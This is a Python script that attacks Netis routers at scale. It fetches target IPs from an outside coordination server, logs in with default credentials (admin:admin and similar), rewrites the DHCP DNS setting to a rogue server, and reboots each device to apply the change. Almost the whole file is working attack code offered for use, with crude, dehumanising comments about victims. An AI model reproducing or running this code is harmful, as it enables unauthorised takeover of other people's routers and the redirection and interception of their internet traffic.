#router mod
import requests
import sys
import time
 
# Do not change the nick, leave as is
nick = "fuckisis"
dns_server = "" # rogue server here
aryPWDs = ['guest:guest','admin:admin','netis:password']
 
session_token = {'SessionID':''}
blnGo = True
url = ""
 
while blnGo == True:
    # Get the next target
    r = requests.get("http://optools.anonops.com/GetTarget.php?o=opnetisrape&c=Ip&n=" + nick)
    target = r.content
    rep = requests.get("http://optools.anonops.com/UpdateTarget.php?c=Ip&o=netisrape&n=" + nick + "&t=" + str(target))
    print "Let's rape: " + str(target)
 
    blnSuccess = False
    blnTimeout = False
    xX = 0
    while blnSuccess == False and target <> "noassignment":
        loginpair = aryPWDs[xX]
        aryLogin = loginpair.split(":")
        username = aryLogin[0]
        password = aryLogin[1]
 
        print "   login: " + str(username) + " - " + str(password)
 
        try:
            #login
            url1 = "http://" + target+"/login.cgi"
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0'}
            payload = [('username',username),('password',password),('submit.htm?login.htm','Send')]
            r = requests.post( url1,data=payload, verify=False, headers = headers, cookies=session_token)
 
            #check login success
            if "Username or password error, try again!" in str(r.text):
                print "   " + str(target) + " creds incorrect"
                #sys.exit(1)
                xX = xX + 1
                if xX > 2:
                    blnTimeout = True
                    print "Those assholes actually changed the password...next"
            else:
                break
        except:
            blnTimeout = True
            blnSuccess = True
            print "   " + str(target) + " timed out...moving on to next helpless victim"
 
    if blnTimeout == False:
        print "   I am in! Raping now..."
        try:
            #submit DNS change
            url2 = "http://" + target + "/form2Dhcpd.cgi"
            headers = {'Referer': str(target) + '/dhcpd.htm','User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0'}
            payload = [('lan_ip','192.168.1.1'),('lan_mask','255.255.255.0'),('dhcpmode','2'),('lan1','lan1'),('lan2','lan2'),('lan3','lan3'),('lan4','lan4'),('wlan','wlan'),('vap0','vap0'),('vap1','vap1'),('vap2','vap2'),('vap3','vap3'),('dhcpRangeStart','192.168.1.2'),('dhcpRangeEnd','192.168.1.254'),('dhcpSubnetMask','255.255.255.0'),('dfgw','192.168.1.1'),('ltime','1440'),('dname','domain.name'),('dns1',dns_server),('dns2',''),('dns3',''),('relayaddr','192.168.2.242'),('submit.htm?dhcpd.htm','Send'),('save','Apply Changes')]
            r = requests.post(url2,data=payload, verify=False, headers = headers, cookies=session_token)
 
            #for debugging
            #url2 = url+"/dhcpd.htm"
            #r = requests.get(url2, verify=False, headers = headers, cookies=session_token)
            #print "output after change"
            #print str(r.text)
 
            # Commit Changes
            print "   comitting changes"
            url3 = "http://" + target + "/form2Reboot.cgi"
            headers = {'Referer': str(target) + '/reboot.htm','User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0'}
            payload = [('rebootMode','0'),('save','Commit Changes'),('submit.htm?reboot.htm','Send'),('submit.htm?reboot.htm','Send')]
            r = requests.post(url3,data=payload, verify=False, headers = headers, cookies=session_token)
 
        except:
            blnSucces = False
   
 
        print "sleeping for a bit (not too noisy)"
        time.sleep(1)
